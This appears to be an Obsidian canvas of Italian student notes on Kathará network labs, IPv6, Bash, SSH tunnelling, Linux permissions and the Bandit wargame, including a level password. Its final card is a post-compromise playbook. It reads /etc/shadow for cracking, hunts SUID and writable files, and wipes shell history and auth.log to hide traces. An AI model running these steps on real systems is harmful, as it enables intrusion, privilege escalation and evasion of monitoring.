		{"id":"339d53393538d01d","type":"text","text":"# Laboratorio 1 - 06/03\n\nkatharà, configurazione ex1 ex2\n\nnella cartella lab1, il contenuto di ogni cartella ex1 è la topologia della rete, e in lab.conf la configurazione di rete\n\n- r1[0]='A' significa che il router r1 ha un interfeccia eth0 connessa alla rete A.\n- r1[bridged] - r1 è connesso ad internet, i.e. gli viene assegnato un IP per l'esterno, diventa il default gateway.\n- `r1[sysctl]` - sysctl setuppa delle cose del kernel, in ex1 configuro r1 come forwarder (router) sia per ipv4 che 6.\n\nin una cartella dove c'è lab.conf, `katharà lstart` o `lstart` se c'è l'alias.\n\n`kathara settings` - docker network plugin deve essere settato alla prima opzione (senza `_vde`).\n\ndice una roba su come cambiare il font, vedi rec intorno a 20 min (dopo settings)\n\nslide 11 - nel file di configurazione sono tutti là (ip, netmask, ...)\n- ifconfig ipmask e mask, route for default gateway, e ??.conf (REC!!)\n\nex1 - ?\n\nex2 - configura server, avvialo, poi passa ai pc. per pc2 usa dhclient","x":-9320,"y":7469,"width":759,"height":640},
		{"id":"c43c09b5a27c6f80","type":"text","text":"# Katharà\n\nCon Docker, creiamo un container per ogni nodo virtuale, dopodiché definiamo una rete di tipo `bridge` personalizzata con cui connettere i vari nodi. Questo crea uno schema di packet switching interno all'ambiente Docker, che di fatto simula una rete internet.\n\nAbbiamo sostanzialmente descritto il principio di funzionamento di ***Katharà***.\n\nPartiamo da una cartella in cui siano presenti i file di configurazione\n\n- `lab.conf`, che definisce il ruolo dei vari elementi di rete (e.g. router o pc);\n- `*.startup`, che definiscono le configurazioni iniziali dei vari elementi di rete.\n\nA questo punto possiamo fare `kathara start`, o sfruttiamo l'`alias` `lstart`, se presente. In modo analogo possiamo riavviare l'ambiente se qualcosa non va (`lrestart`), fermare tutto (`lclean`) o forzare la pulizia dell'ambiente se abbiamo bloccato tutto (`kwipe`).","x":-10240,"y":7509,"width":759,"height":560,"color":"3"},
		{"id":"3d311ec1479c022e","type":"text","text":"# Laboratorio 2 - 13/03\n\n`/etc/resolve.conf` per il DNS\n\n/etc/hosts overrides dns with hostnames\n\nschema generale di quello che sta succedendo (13/03): finisce slides del secondo lab, torna indietro a fare l'ex3 del primo lab:\n\n- setup concettuale della rete\n- implementazione, come in ex1 ed ex2\n- wget per testare\n- tcpdump per vedere cosa succede\n\t- strano comportamento di forwarding di r0 dovuto al longest prefix match. tocca settarlo a mano.\n- ovviamente una volta che configuri correttamente la prima sottorete, la seconda è un \"copia e incolla\"\n\nA quanto pare sta roba si fa a network infrastructures (1 semestre cybersec). Quindi dobbiamo recuperare ben due esami come prerequisiti a questo :)\n\nreverse dns lookup?\nping è SW, fa ICMP requests\n\n___\na questo punto usa wireshark, slides di lab wireshark\n\nref. slide 42. wireshark crea una nuova interfaccia che si attacca alla LAN A, in modo da sniffare roba e potenzialmente fare hijacking.\n\nsegue analisi dei pacchetti su wireshark e distinguo indirizzi IP/Mac (i mean ok bro)\n\n___\nSI È DIMENTICATO IL MICROFONO NELLA REC FINO A MO. DAJE.\n\nmo mi sa continua con wireshark. Sì, ma dice con un server che usa un HTTP primordiale.","x":-9320,"y":8227,"width":759,"height":1283},
		{"id":"399d0f8bfe3f80d5","type":"text","text":"# IPv6 - 07/03\n\nad oggi abbiamo finito gli IPv4, e ne allochiamo di nuovi solo se qualcuno li restituisce a IANA. \n\nIoT con IPv6?\n\nIPv6 ha $\\sim 3.4\\cdot 10^{38}$ (o alla 36?) indirizzi. In teoria risolve la necessità di usare il NAT. Ogni hex sono 4 bit. 128 bit sono 32 esadecimali in 8 gruppi da 4. parte di rete e parte di host sono simmetriche (16 e 16 hex - sì, ma per essere precisi i primi 3 gruppi sono network, il quarto per la sottorete e gli altri gli host). huge amount of hosts, questo protegge gli host perché enumeration diventa difficilissimo (ci metti ordine secoli).\n\n:: comprime intere stringhe di 0. Non ogni singolo blocco da 4 hex!: cioè non si trova `AB::::CD:1200::10`, si comprime solo la più lunga (e se ce ne sono due uguali si comprime solo la prima). Quindi posso avere `2001:DB8:1000::1` (meaning `2001:DB8:1000:0:0:0:0:1`, typical exam question)\n\nslide 25 (ignora anycast) - no broadcast, diventa multicast\n\n- global unicast = identico a ipv4\n- link local sono usati solo in un link interno alla rete. ogni coppia che comunica in locale ha una coppia di ipv6.\n- unique local = indirizzi privati di ipv4\n- embedded ipv4 - retrocompatibilità\n\n\n","x":-8220,"y":8909,"width":759,"height":625},
		{"id":"7b351e91b16f865e","type":"text","text":"# Level 0\n\nLa password per il livello 1 si trova banalmente nel file `readme` del livello 0:\n\n```\nZjLjTmM6FvvyRnrb2rfNWOZOTa6ip5If\n```\n\nQuando fai `exit`, `SSH` ti avvisa se stai lasciando processi `running` o `stopped` (`CTRL + Z`). Se compare un `There are stopped/running jobs`, per non lasciare processi orfani fai\n\n```\nkill -9 $(jobs -p)\n```","x":-207,"y":1295,"width":759,"height":319,"color":"4"},
		{"id":"0f2a36c9dcf84a3e","type":"text","text":"# Linux `Bash` Commands (Bandit)\n\nApprofonditi in ordine di come compaiono in [Bandit](https://overthewire.org/wargames/bandit/bandit0.html) e di come mi gira.\n\nSi accede al livello `N` del gioco loggando in `ssh` all'`host` `bandit.labs.overthewire.org` mettendo come `user` `banditN` e come `password` quella ottenuta al livello `N-1`.\n\nLa sia username che password del livello zero sono `bandit0`. Nel seguito, il riquadro `Level N` contiene la soluzione per trovare la password del livello `N`.","x":-1216,"y":1296,"width":759,"height":319,"color":"6"},
		{"id":"f4f2a29153e51075","type":"text","text":"# Bash - Utility\n\n- `man [comando]` - Restituisce le istruzioni per il `comando`. Ha una vecchia versione basata su text editor chiamata `info`;\n- `apropos [pattern]` - Restituisce tutti i comandi che contengono `[pattern]` nella `SYNOPSIS` del manuale `man` (e.g. se voglio un comando che registra qualcosa potrei cercare `apropos capture`). Utile anche per capire quali comandi sono installati in una `shell` remota, o se ti ricordi cosa fa il `comando` ma non il nome;\n- `alias` - Restituisce tutti gli `alias`, definizioni homemade di comandi con diverse opzioni (e.g. `alias ll='ls -alF'`, i.e. se scrivo `ll` il terminale legge `ls -alf`);\n- `wc` - Restituisce il numero di  righe (`-l`), parole (`-w`) o `byte` (`char`, `-c`) di un `file1`. Se non specifico nessuna opzione, restituisce tutte queste cose in quest'ordine;\n- `du` - Disk Utilization della directory. Tipicamente utilizzato con opzioni `-ah` (restituisce il peso in formato leggibile di tutti i file della directory) o `-sh` (per le sole directory);\n- `sort` - Restituisce le righe di input in ordine lessicografico. Posso specificare `-n` (ordinamento numerico), `-r` (ordine inverso), `-u` (elimina i duplicati<span style=\"color:rgb(236, 155, 14)\">, in teoria, perché a me non ha mai funzionato</span>), `-k N` (ordina secondo la colonna `N`);\n- `strings` - Converte il contenuto di un file in stringhe stampabili;\n- `uniq` - Rimuove righe duplicate ***consecutive*** (quindi si usa spesso dopo `sort`). `-u` mostra solo le righe uniche, `-d` solo quelle duplicate, `-c` conta le occorrenze;\n\t- A me funziona solo come `sort data.txt | strings | uniq -u` (cfr. `livello 8`).\n- ","x":-2225,"y":2117,"width":759,"height":1278,"color":"3"},
		{"id":"430d8b04ba92b85a","type":"text","text":"# Espansioni condizionali\n\n| Sintassi          | Descrizione                                                           |\n| ----------------- | --------------------------------------------------------------------- |\n| `${VAR:-default}` | Se `VAR` è vuota o non esiste, usa `\"default\"` **ma non la assegna**. |\n| `${VAR:=default}` | Se `VAR` è vuota o non esiste, le assegna `\"default\"`.                |\n|                   |                                                                       |\n\n\n```bash\necho ${USER:-guest}   # Se USER non esiste, stampa \"guest\"\necho ${HOME:=/tmp}    # Se HOME non è settata, la assegna a \"/tmp\"\n```\n\n---\n\n| Sintassi                              | Descrizione                                 |\n| ------------------------------------- | ------------------------------------------- |\n| `${VAR:?Errore, VAR non è impostata}` | Se `VAR` non esiste, stampa errore ed esce. |\n|                                       |                                             |\n```bash\necho ${CONFIG_PATH:?Errore, variabile non settata!}\n```\n\nSe `CONFIG_PATH` è vuota, Bash stamperà\n\n```bash\nbash: CONFIG_PATH: Errore, variabile non settata!\n```\n\nUtile per script che richiedono variabili obbligatorie.\n\n---\n\n### Substringing e Sostituzioni Avanzate\n\n|Sintassi|Descrizione|\n|---|---|\n|`${VAR:0:5}`|Estrae una sottostringa: primi `5` caratteri.|\n|`${VAR//o/X}`|Sostituisce **tutti** gli \"o\" con \"X\".|\n|`${VAR/#Hello/Hi}`|Sostituisce `\"Hello\"` **all'inizio** con `\"Hi\"`.|\n|`${VAR/%World/Everyone}`|Sostituisce `\"World\"` **alla fine** con `\"Everyone\"`.|\n\n```bash\nVAR=\"HelloWorld\"\n\necho ${VAR:0:5}    # → \"Hello\"\necho ${VAR//o/X}   # → \"HellXWXrld\"\necho ${VAR/#Hello/Hi}  # → \"HiWorld\"\necho ${VAR/%World/Everyone}  # → \"HelloEveryone\"\n```","x":-3234,"y":2117,"width":759,"height":1278},
		{"id":"eab759960ddcf808","type":"text","text":"# Attaccare SSH\n\nPartiamo da un presupposto: se il server è configurato bene, è tendenzialmente difficile.\n\nNelle opzioni di configurazione, `sshd_config` può prevedere un numero massimo di tentativi da un certo `IP` (`MaxAuthTries`), oltre il quale un sistema come `fail2ban` può bannare il tuo `IP` (i.e. non accettare più alcun tentativo da parte tua).\n\nQuesto chiaramente presuppone che tu stia facendo brute force su una password debole. È però possibile che l'`host` accetti solo autenticazione con chiavi asimmetriche, rendendo di fatto qualsiasi attacco impossibile (a meno che non fai tipo MitM al momento dello scambio di chiavi, ma stiamo parlando di cose complicate).\n\nSe sei già dentro al sistema, potresti voler trovare le `password` di altri `user`. Questo si riduce a un meccanismo di hacking interno alla macchina, per cui dovresti avere i permessi per accedere a `/bin/shadow` e usare un tool come `hashcat` o `john` per risalire ai dati a partire dagli hash (cosa notoriamente difficile).","x":-1216,"y":-1038,"width":759,"height":439,"color":"4"},
		{"id":"4282f1f0f685c1b7","type":"text","text":"# `ssh-keygen` e Chiavi Asimmetriche\n\nSe non ti va di mettere la password ad ogni connessione (anche perché mandarla ogni volta in giro su Internet è una potenziale vulnerabilità) puoi creare una ***coppia di chiavi*** con il comando ***`ssh-keygen`*** e copiare la chiave pubblica sulla macchina remota con `ssh-copy-id user@host`. La scrittura più generale possibile è`ssh-keygen [opzioni] -t <algoritmo> [opzioni dell'algoritmo]`, dove\n\n- le `[opzioni]` includono `-f <file>` (specifica il file di output in cui vengono salvate le chiavi), `-C \"comment\"` (inserisce un commento, tipo \"`Chiave per GitHub`\"), `-N \"passphrase\"` (protegge l'accesso alla chiave privata), `-q` (modalità \"silenziosa\") e `-y` (data una chiave privata, ne estrae la pubblica);\n- `-t <algoritmo>` è in realtà facoltativo (in assenza di specifica si usa ***RSA*** con chiave a `3072 bit`), ma si usa in genere ***ed25519***, che rappresenta un buon compromesso tra sicurezza e velocità;\n- le `[opzioni dell'algoritmo]` si riducono di norma alla lunghezza della chiave (`-b`), ma ad esempio `ed25519` usa sempre chiavi a `256 bit`.\n\nLe chiavi private vengono salvate di default in `~/.ssh`, dove posso creare e settare un file `config` per specificare quale chiave usare per quale server (altrimenti, in modo molto poco furbo, `ssh` le prova tutte!).\n\n```\nHost mio-server\n    HostName server.example.com\n    User utente\n    IdentityFile ~/.ssh/mia_chiave\n```","x":-1216,"y":-30,"width":759,"height":686,"color":"4"},
		{"id":"8603be4ae948e472","type":"text","text":"# Opzioni Furbe\n\nLe `[options]` di `ssh` sono in realtà uno strumento molto potente.\n\n- `-N -f -q -L` - ha senso usarli insieme: `-N` apre una connessione senza terminale, e uno si potrebbe chiedere \"ma allora a che serve?\". Ecco perché parliamo anche di `-L`, che fa ***port forwarding*** dalle mie porte locali a quelle dell'host remoto. Cioè?\n\t- `-L <porta_locale>:<host_remoto>:<porta_remota>` si comporta così: quando arriva un qualcosa alla mia `porta_locale`, questo qualcosa viene reindirizzato direttamente alla `porta_remota` dell'`host_remoto`;\n\t\t- Nota che `host_remoto` potrebbe non essere l'`host` con cui ho stabilito la connessione `ssh`! Con `ssh -L 3306:192.168.1.50:4070 user@host` sto dicendo \"`Ciao host, mo' io ti mando qualsiasi cosa arrivi sulla mia porta 3306, tu devi girare tutto a 192.168.1.50:4070 (dal tuo punto di vista, i.e. come se fossi tu a mandarla). Come? Boh, veditela tu`\";\n\t\t- Di norma sta roba si usa per accedere ad un qualche servizio dal punto di vista di `host`, quindi scrivendo `ssh -L 3306:localhost:3307 user@host`. In pratica così sto dicendo una roba del tipo `Devi fare una roba per me, ti inoltro tutto ciò che passa sulla mia porta 3306 alla tua porta 3307` (***`localhost`*** è un placeholder per l'indirizzo di ***loopback*** `127.0.0.1`);\n\t- `-N` evita di aprire il terminale, quindi fa consumare meno risorse all'`host`, mentre `-f` mette il processo in ***background***;\n\t\t- Uno potrebbe pensare che così si guadagna in privacy, ma non è vero. Il processo resta visibile ad un comando `ps aux`, anche se si può provare a limitare la quantità di log registrati tramite la ***quiet mode*** (`-q`).\n\t- `-L` ha anche l'opzione inversa: `-R a:localhost:b` significa che tutto ciò che arriva all'`host` sulla porta remota `a` viene mandato alla mia macchina sulla porta `b`.\n- `-D` - Configura un ***proxy SOCKS***, i.e. un proxy che opera a livello di trasporto. Questo gli permette di inoltrare dati senza fare le solite porcate che fanno i proxy `HTTP` (e.g. filtrare il traffico, o spiarlo), nonché di inoltrare qualsiasi tipo di richiesta. `ssh -D 8080 user@host` sta dicendo ad `host` che quando arrivano richieste da me, lui deve mandarle su Internet come se venissero da lui. ","x":-207,"y":-1250,"width":759,"height":848,"color":"4"},
		{"id":"22dfa299c258426a","type":"text","text":"# SSH - `ssh [options] user@host`\n\n***Secure Shell*** usa di norma la  ***porta 22*** per connettere il proprio terminale ad un terminale remoto eseguito come `user` all'indirizzo `host` (che può sia essere un indirizzo `IP` sia un nome, che verrà in caso risolto da DNS).\n\nQuesto non significa che puoi entrare a caso nei sistemi altrui. Il campo `user` deve essere un utente registrato su quell'`host`, e ti verrà richiesta la sua `password`.\n\nLe opzioni di base includono\n\n- `-p 1234` - si connette alla porta `1234` invece che alla `22`;\n- `-i </path/to/key>` - specifica che chiave usare per la connessione;\n- `-T` - usalo se vuoi eseguire solo un comando (concatenato come \"`ssh -T user@host 'comando'`\" e poi chiudere la connessione, senza aprire una shell interattiva;\n- `-X` - se vuoi avviare applicazioni con una GUI X11 sull'`host` remoto, questa opzione ti permette di visualizzare tale GUI sul tuo computer (risultato simile si ottiene con `-Y`, che ha meno restrizioni di sicurezza e in genere si usa se `-X` non funziona).\n\nUna sessione funzionante si termina con `exit` o `CTRL + D`, una \"rotta\" con `~.` (senza poi premere invio!), altrimenti killando il processo `ssh` da un altro terminale (se proprio devi).","x":-207,"y":45,"width":759,"height":536,"color":"6"},
		{"id":"e660a0288c5cee37","type":"text","text":"# Sì ok, ma che è il `Bash`?\n\nUna ***shell*** è un interprete dei comandi dell'utente verso il SO: se vuoi dire qualcosa al cuore del tuo computer devi parlare il suo linguaggio, o in alternativa un linguaggio che qualcuno (i.e. la shell) traduce in comandi comprensibili per il SO.\n\nNel tempo sono state create diverse `shell`, a cui corrispondono diversi linguaggi. ***Bash*** (***Bourne Again Shell***) è un'evoluzione della prima `shell`, chiamata ***sh*** (***Bourne Shell***, che è il tizio che l'ha sviluppata). In mezzo ci sta un tot di roba, in parte ancora utilizzata (e.g. `ksh`) e in parte caduta nell'oblio (e.g. `csh`).\n","x":-2225,"y":1295,"width":759,"height":319,"color":"4"},
		{"id":"c61155df72f8f47a","type":"text","text":"# Expansions & History\n\n\nSalto le cose che so e ne scrivo due che non sapevo.\n\n- ***Expansions*** - `Bash` ti consente di creare shortcut per varie cose:\n\t- ***Brace Expansion*** - Tratta il contenuto di parentesi graffe `{}` come una lista:\n\t\t- `file{1,2,3}.txt` $\\to$ `file1.txt file2.txt file3.txt`;\n\t\t- `{a..f}` $\\to$ `a b c d e f`;\n\t\t- `{001..005}` $\\to$ `001 002 003 004 005`;\n\t\t- `{a..z..2}` $\\to$ `a c e g i ...` (espande con passo `2`);\n\t\t- `{A,B}{1,2,3}` $\\to$ `{A1 A2 A3 B1 B2 B3}` (fa il prodotto cartesiano).\n\t- ***Tilde Expansion*** - Quando `Bash` vede `~` lo espande nella `home directory` dell'utente corrente;\n\t- ***Parameter Expansion*** - Espande le variabili, e.g. `$HOME` $\\to$ `/home/user`;\n\t\t- Si possono mettere dentro robe condizionali\n\t- ***Command Substitution*** - `$(comando)` esegue il `comando` ed usa il suo output (si può fare anche con le `backtick`); \n\t- ***Arithmetic Expansion*** - `$((algebra))` esegue l'`algebra` ed usa il suo output;\n\t- ***Word Splitting*** - Dato `LIST=\"1 2 3\"`, ci sono due comportamenti di default:\n\t\t- `$LIST` splitta l'output, ovvero `1`, `2` e `3` sono entità separate;\n\t\t- `\"$LIST\"` conserva la struttura non splittata di stringa.\n\t- ***Pathname Expansion*** - Nell'indicare il nome di un file, posso usare `*` per indicare qualsiasi numero di qualsiasi caratteri, `?` per intendere un carattere qualsiasi, `[abc]` (***wildcard expansion***) per indicare una qualsiasi tra le lettere `a`, `b` e `c` e `{a,b,c}` (come in precedenza) per indicarle tutte.\n- ***History*** - `Bash` tiene traccia di quello che fai, ma oltre ad andare su e giù tra i comandi con le frecce puoi fare molto di più:\n\t- `history` visualizza tutti i comandi eseguiti, numerandoli riga per riga;\n\t- `!!` ripete l'ultimo comando eseguito;\n\t- `!n` esegue il comando `n` nella lista di `history`;\n\t- `!ssh` esegue l'ultimo comando nella `history` che inizia per `ssh`;\n\t- Se sbaglio a scrivere un comando, posso correggerlo con `^errore^correzione`;\n\t- `!$` espande l'argomento del precedente comando (e.g. `mkdir mydir; cd !$`).","x":-3234,"y":1008,"width":759,"height":894,"color":"4"},
		{"id":"1cdecb81c364493b","type":"text","text":"# Sono Dentro! Ora Cosa Faccio?\n\nBene, sono entrato in `ssh`. Sì, ma dove?\n\n- ***Kernel e SO*** - Posso stampare un riassunto con `uname -a`, che mostra \n\t- `nome_kernel`, e.g. `Linux`;\n\t- `hostname`, e.g. `my_pc`;\n\t- `versione_kernel`, e.g. `5.15.0-91-generic` (`generic` è la versione di Ubuntu);\n\t- `numero_build`, i.e. quante volte il kernel è stato ricompilato. In che senso? Quelli che distribuiscono il SO (e.g. ***Canonical*** per Ubuntu) non si mettono a firmare nuove versioni ad ogni minimo fix. Un aggiornamento minore (eseguito con `apt upgrade`) può includere una modifica al kernel ed una conseguente ricompilazione, che incrementa solo il numero di build, e.g. `#102-Ubuntu SMP Fri Jan 5 12:06:54 UTC 2024` (di norma ti dice anche quando è stato ricompilato l'ultima volta);\n\t\t- Se so che nella build `#102` c'è una ***vulnerabilità*** nota che è stata fixata solo successivamente (e.g. nella `#105`, l'ultima), posso sfruttarla per fare robe;\n\t\t- Se poi sono molto interessato a queste cose, con `cat /proc/version` trovo anche i dettagli sul tipo di compilatore usato.\n\t- `architettura`, e.g. `x86_64`;\n\t- `SO`, e.g. `GNU/Linux`;\n\t\t- Se mi interessa la distribuzione specifica del kernel, `cat /etc/os-release`. Questo in genere serve per capire la compatibilità dei SW che vuoi usare.\n- ***Chi sono io?*** - Potrei essere interessato a capire in qualità di che utente sono loggato.\n\t- `whoami` - Restituisce il nome dell'utente attuale (in teoria dovrei saperlo, se sono entrato con `ssh` dovrebbe coincidere con l'`user`);\n\t\t- <span style=\"color:rgb(236, 155, 14)\">Sono un utente standard o un account di servizio?</span> `cat /etc/passwd | grep $(whoami)` restituisce le righe del file `passwd` in cui compare il mio `user`. <span style=\"color:rgb(236, 155, 14)\">Se vedi qualcosa tipo `/bin/bash` o `/bin/sh` alla fine della riga, **sei un utente interattivo**. Se invece vedi `/usr/sbin/nologin` o `/bin/false`, è un account di servizio con accesso limitato.</span>\n\t- `id` - L'`user` è solo una label. Il SO mi identifica con un numero, detto ***UID***;\n\t\t- `0` corrisponde a `root`, `1-999` sono in genere utenti di sistema (e.g. servizi, demoni, ...) e `1000+` sono utenti normali;\n\t\t- Posso specificare `id -u mario` per sapere l'`UID` dell'utente `mario`;\n\t\t- A questo utente saranno associati anche dei gruppi, pertanto l'output di `id` sarà una lista `#id(group)` dove `#id` è il numero associato alla label `group`.\n- ***Chi sono gli altri?*** - Chi altro è loggato, e cosa sta facendo?\n\t- `who` e `w` permettono di vedere, rispettivamente, queste due cose;\n\t- `last` è uno storico degli accessi <span style=\"color:rgb(236, 155, 14)\">SSH</span>;\n- ***Cosa posso fare?*** - Per capirlo, mi serve sapere quali sono i miei privilegi. ","x":-207,"y":2117,"width":759,"height":1278,"color":"3"},
		{"id":"e218e0589f82e95a","type":"text","text":"# Premesse - Sistemi Operativi II","x":-1216,"y":4000,"width":759,"height":240,"color":"6"},
		{"id":"26065c6695f63b89","type":"text","text":"# Proprietari e Permessi\n\nQuando usi l'opzione `-l` in `ls` ci stanno diverse cose in output.\n```bash\n-rw-r--r-- 1 alice users 1234 Feb 21 12:00 file.txt\n```\n\n- Il primo `-` dell'esempio indica il tipo di `inode`, e può assumere gli stessi valori che specifico in una richiesta `-type` nel comando `find`;\n- I successivi `9` caratteri rappresentano i ***permessi*** per il ***proprietario*** (`alice`), per il ***gruppo*** (`users`) e, infine, per tutti gli ***altri*** (i.e. che non sono né `owner` né `group`);\n- Seguono numero di ***hard links***, dimensione, ultima modifica e nome del file.\n\nOgni gruppo di tre lettere (`rwx`) può essere rappresentato da una stringa binaria che ci dice cosa è attivo e cosa no (e.g. `101` $\\to$ `r-x`), ma possiamo ulteriormente comprimere questa informazione traducendola in decimale (e.g. `r-x` $\\to$ `101` $\\to$ `5`). Per questo, i permessi sono generalmente indicati con tre numeri da `0` a `7`.\n\nPosso modificare\n\n- i permessi, con `chmod [perm] [file]`, dove `[perm]` può essere sia una sacra triade ottale come vista prima (e.g.  `755`) o singole aggiunte/rimozioni come `u+x` (aggiunge il permesso di esecuzione al proprietario), `g-w` (toglie la scrittura al gruppo) o `o+r` (aggiunge la lettura a `others`);\n\t- ***Solo il proprietario e root*** possono usare `chmod`, indipendentemente dai permessi di scrittura attuali (modificare i permessi non conta come scrittura sul `file`).\n- il proprietario e il gruppo, con `chown new_owner:new_group [file]`. `:new_group` è opzionale, posso cambiare solo lui con `chgrp`.\n\t- ***Solo root*** può usare `chown`.","x":2820,"y":-1249,"width":759,"height":848,"color":"6"},
		{"id":"5cce19db2eacb68d","type":"file","file":"nmap_option_s.png","x":6857,"y":-818,"width":759,"height":417},
		{"id":"0ab6e3f18680f1a9","type":"text","text":"curl, watch, fc, ","x":6927,"y":-1409,"width":620,"height":320,"color":"1"},
		{"id":"14bf4627959145d2","type":"text","text":"\n# **📊 `awk` - Il Coltellino Svizzero per Dati Testuali**\n\n`awk` è un linguaggio di scripting integrato nei sistemi Unix/Linux, usato per **analizzare, manipolare e trasformare** dati tabellari (testo strutturato in colonne).\n\n### **📌 Uso base**\n\n```bash\nawk '{print $1}' file.txt\n```\n\nStampa la **prima colonna** di ogni riga del file `file.txt`.\n\n### **📌 Opzioni avanzate**\n\n|Comando|Descrizione|\n|---|---|\n|`awk '{print $1, $3}' file.txt`|Stampa **prima e terza colonna**.|\n|`awk '/error/ {print $0}' log.txt`|Stampa le righe contenenti `\"error\"`.|\n|`awk -F: '{print $1}' /etc/passwd`|Usa `:` come separatore per estrarre i nomi utente.|\n|`awk '{sum += $2} END {print sum}' dati.txt`|Somma tutti i valori della **seconda colonna**.|\n|`awk 'NR==5' file.txt`|Stampa **solo la quinta riga**.|\n|`awk '{print NR, $0}' file.txt`|**Numera** ogni riga e la stampa.|\n\n### **🛠️ Trucchi da Hacker**\n\n1️⃣ **Trovare gli utenti con UID < 1000:**\n\n```bash\nawk -F: '$3 < 1000 {print $1, $3}' /etc/passwd\n```\n\n2️⃣ **Elencare i processi e la memoria che consumano:**\n\n```bash\nps aux | awk '{print $1, $2, $4 \"%\"}'\n```\n\n3️⃣ **Contare il numero di occorrenze di una parola in un file:**\n\n```bash\ngrep \"error\" log.txt | awk '{count++} END {print count}'\n```\n\n4️⃣ **Estrarre le richieste HTTP GET da un file di log:**\n\n```bash\nawk '$6 == \"\\\"GET\"' access.log\n```\n\n","x":7866,"y":-2800,"width":759,"height":1164},
		{"id":"5cff47e4f204089c","type":"text","text":"# Bash - Manipolare Cose: `awk`","x":6858,"y":-2696,"width":759,"height":957},
		{"id":"4b0914af8d708d70","type":"text","text":"# **🕵️‍♂️ **\n\nHai appena stabilito una connessione **SSH** con una macchina remota. Il tuo obiettivo ora è **capire dove ti trovi**, **chi sei**, **cosa puoi fare** e **fino a che punto puoi spingerti**. Un hacker esperto deve ottenere **il massimo delle informazioni nel minimo tempo possibile**, quindi seguiamo un approccio **metodico ed efficiente**. 🚀\n\n---\n\n## **📍 1. Dove Mi Trovo? Identificare il Sistema**\n\nLa prima domanda da porsi è: **che macchina è questa?** Potresti essere su un server Linux, un container Docker, una macchina virtuale... e ogni situazione cambia le tue possibilità d’azione.\n\n🔹 **Controllare il sistema operativo e la distribuzione**\n\n```bash\nuname -a   # Versione del kernel e architettura\ncat /etc/os-release  # Nome della distribuzione Linux\ncat /proc/version  # Info dettagliate sul kernel\n```\n\n💡 **Se vedi qualcosa tipo `container` o `lxc` nel kernel, probabilmente sei in un container Docker o LXC!**\n\n🔹 **Dove sei nel filesystem?**\n\n```bash\npwd   # Mostra la tua directory corrente\nls -la  # Lista tutto, inclusi file nascosti\nmount | column -t  # Controlla i filesystem montati\n```\n\n💡 **Se sei in `/home/user` o `/tmp`, probabilmente sei un utente normale. Se sei in `/root`... jackpot!**\n\n---\n\n## **🆔 2. Chi Sono? Controllare i Permessi dell’Utente**\n\n```bash\nwhoami   # Nome dell’utente attuale\nid       # UID, GID e gruppi dell’utente\ngroups   # Quali gruppi sono associati al tuo utente\n```\n\n💡 **Se il tuo UID è `0`, sei root!** Se no, controlla se sei in gruppi **privilegiati** (`sudo`, `docker`, `adm`... questi possono aiutarti a scalare privilegi).\n\n🔹 **Chi è loggato sulla macchina?**\n\n```bash\nwho      # Lista degli utenti connessi\nw        # Chi è connesso e cosa sta facendo\nlast     # Storico degli accessi\n```\n\n💡 **Se vedi admin o root attivi, potresti aspettare che eseguano un comando con `sudo` e provare un attacco di hijacking.**\n\n🔹 **Sto usando un account di servizio o un utente reale?**\n\n```bash\ncat /etc/passwd | grep $(whoami)\n```\n\nSe vedi qualcosa tipo `/bin/bash` o `/bin/sh` alla fine della riga, **sei un utente interattivo**. Se invece vedi `/usr/sbin/nologin` o `/bin/false`, è un account di servizio con accesso limitato.\n\n---\n\n## **🔎 3. Cosa Posso Fare? Capire i Privilegi**\n\n### **🔹 Ho accesso a `sudo`?**\n\n```bash\nsudo -l\n```\n\n💡 **Se puoi eseguire comandi senza password (`NOPASSWD`), potresti ottenere root facilmente!**\n\n### **🔹 Ci sono comandi con `SUID`?**\n\n```bash\nfind / -perm -4000 2>/dev/null\n```\n\n💡 **Se trovi `/bin/bash` con il bit SUID attivo, puoi eseguire una shell con privilegi elevati!**\n\n---\n\n## **📂 4. Esplorare il Filesystem e i Dati Sensibili**\n\n### **🔹 File Importanti da Controllare**\n\n```bash\ncat /etc/passwd  # Lista degli utenti\ncat /etc/shadow  # Hash delle password (richiede root, ma puoi provare...)\ncat /etc/sudoers  # Configurazione sudo\nls -la /root/  # Vedi cosa c'è nella home di root (se puoi)\n```\n\n💡 **Se hai accesso a `/etc/shadow`, puoi tentare di craccare le password con John the Ripper o Hashcat.**\n\n### **🔹 File con permessi deboli**\n\n```bash\nfind / -type f -perm -o+w 2>/dev/null  # File scrivibili da chiunque\nfind / -type d -perm -o+w 2>/dev/null  # Directory scrivibili da chiunque\n```\n\n💡 **Se un file di configurazione critico è scrivibile da te, potresti modificarlo per ottenere accesso elevato!**\n\n---\n\n## **📡 5. Controllare la Rete e il Contesto**\n\nSe sei entrato via **SSH**, probabilmente il sistema è **parte di una rete più grande**. Potresti cercare altre macchine vulnerabili da attaccare.\n\n🔹 **Quali interfacce di rete ci sono?**\n\n```bash\nip a\n```\n\n💡 **Se vedi un IP privato (`192.168.x.x`, `10.x.x.x`), potresti essere in una rete interna con altre macchine interessanti!**\n\n🔹 **Quali connessioni sono attive?**\n\n```bash\nnetstat -tulnp  # Mostra porte aperte e processi associati\nss -tulnp       # Alternativa più moderna a netstat\n```\n\n💡 **Se vedi servizi con porte aperte, potresti attaccarli per espandere il tuo accesso.**\n\n🔹 **Quali processi stanno girando?**\n\n```bash\nps aux --sort=-%mem  # Processi ordinati per uso memoria\nps aux --sort=-%cpu  # Processi ordinati per uso CPU\n```\n\n💡 **Se vedi un servizio con privilegi elevati, potresti provare un attacco tramite privilege escalation.**\n\n---\n\n## **🎭 6. Rimanere Invisibili**\n\nSe sei entrato in un sistema e vuoi **minimizzare le tracce**, ci sono alcune tecniche per coprire il tuo ingresso.\n\n🔹 **Pulire la cronologia della shell**\n\n```bash\nhistory -c && history -w\n```\n\n🔹 **Disabilitare la cronologia temporaneamente**\n\n```bash\nunset HISTFILE\nexport HISTSIZE=0\nexport HISTFILESIZE=0\n```\n\n🔹 **Eliminare i log SSH**\n\n```bash\n> ~/.bash_history\necho \"\" > /var/log/auth.log  # Richiede privilegi elevati\n```\n\n💡 **Tieni a mente:** Se sei in un ambiente monitorato, potrebbero comunque accorgersi di movimenti sospetti.\n\n---\n\n## **🚀 Conclusione: La Prima Mossa È Capire il Campo di Battaglia**\n\nOra sai **come raccogliere rapidamente informazioni su un sistema** una volta dentro via SSH.\n\n✅ **Dove sei?** Controlla il sistema operativo, il filesystem e la rete.  \n✅ **Chi sei?** Determina i tuoi privilegi e i gruppi a cui appartieni.  \n✅ **Cosa puoi fare?** Scansiona permessi, file sensibili, processi e accessi di rete.  \n✅ **Come coprirti?** Ripulisci tracce, disabilita log e cronologia.\n\n🔎 